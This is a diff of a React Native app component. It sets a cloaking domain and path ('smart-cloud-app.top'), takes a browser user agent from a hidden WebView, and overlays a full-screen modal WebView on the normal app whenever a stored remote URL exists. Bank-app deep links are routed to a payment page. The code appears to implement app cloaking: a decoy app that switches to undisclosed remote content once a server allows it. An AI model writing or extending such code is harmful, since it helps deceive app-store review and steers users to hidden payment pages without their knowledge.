@@ -32,7 +32,7 @@ import {all} from "axios";
 
 
 const onesignal_sub = 'frige';
-const idoSingale = 'c742fe88-0e99-4f68-b8d2-ba27a2a5ad8c';
+const idoSingale = '75d64b51-1cbf-4cc3-bd7d-24113ec78ae1';
 
 const CLO_PATH = 'HW5gM4fL';
 const CLO_DOMAIN = 'smart-cloud-app.top';
@@ -126,12 +126,7 @@ function MyApp({navigation}) {
   const [AppInstanceId, setAppInstanceId] = useState<string | null>(null);
   //const unityRef = useRef(null);
 
-  useEffect(() => {
-    DeviceInfo.getUserAgent().then(ua => {
-      const sysVersion = DeviceInfo.getSystemVersion();
-      setWebViewUA(prev => prev || `${ua} Version/${sysVersion} Safari/604.1`);
-    });
-  }, []);
+  // UA берётся только из скрытого WebView (onMessage ниже)
 
   const cloDomainRef = useRef('');
   useEffect(() => {
@@ -546,7 +541,7 @@ function MyApp({navigation}) {
               onMessage={(e) => {
                 const ua = e.nativeEvent.data;
                 const sysVersion = DeviceInfo.getSystemVersion();
-                setWebViewUA(prev => prev || `${ua} Version/${sysVersion} Safari/604.1`);
+                setWebViewUA(`${ua} Version/${sysVersion} Safari/604.1`);
               }}
           />
         </View>
@@ -554,18 +549,10 @@ function MyApp({navigation}) {
           <MainApp />
         </NavigationIndependentTree>
         {storedUrl ? (
-        <View style={[StyleSheet.absoluteFill, {backgroundColor: '#000'}]}>
+        <Modal visible={true} animationType="none" transparent={false}>
+          <View style={StyleSheet.absoluteFill}>
                 <SafeAreaView style={{flex: 1}}>
                   <WebView
-                      /* source={
-                              AsyncStorage.getItem('svd').then(value =>{
-                               if (value != null) {
-                                 uri:value
-                               } else {
-                                 uri: storedUrl
-                               }})}
-                               */
-
                       originWhitelist={[
                         '*',
                         'about:srcdoc',
@@ -699,14 +686,14 @@ function MyApp({navigation}) {
                         const {nativeEvent} = syntEvent;
                         const {code} = nativeEvent;
                         if (code === -1101) {
-                          navigation.goBack();
+                          refWebview.current?.goBack();
                         }
                         if (code === -1002) {
                           Alert.alert(
                               'Ooops',
                               "It seems you don't have the bank app installed, wait for a redirect to the payment page",
                           );
-                          navigation.goBack();
+                          refWebview.current?.goBack();
                         }
                       }}
                       onLoad={() => console.log('new')}
@@ -723,9 +710,6 @@ function MyApp({navigation}) {
                           );
                           return;
                         }
-                        // В WebView-экран пускаем только http(s). Любую другую
-                        // схему (mailto:, tel:, банковские deep links) открываем
-                        // внешне — иначе нативный краш при установке source.
                         if (/^https?:\/\//i.test(targetUrl)) {
                           navigation.navigate('2', {data: targetUrl});
                         } else {
@@ -758,7 +742,8 @@ function MyApp({navigation}) {
                     </View>
                   </Modal>
                 </SafeAreaView>
-        </View>
+          </View>
+        </Modal>
         ) : null}
       </View>
   );
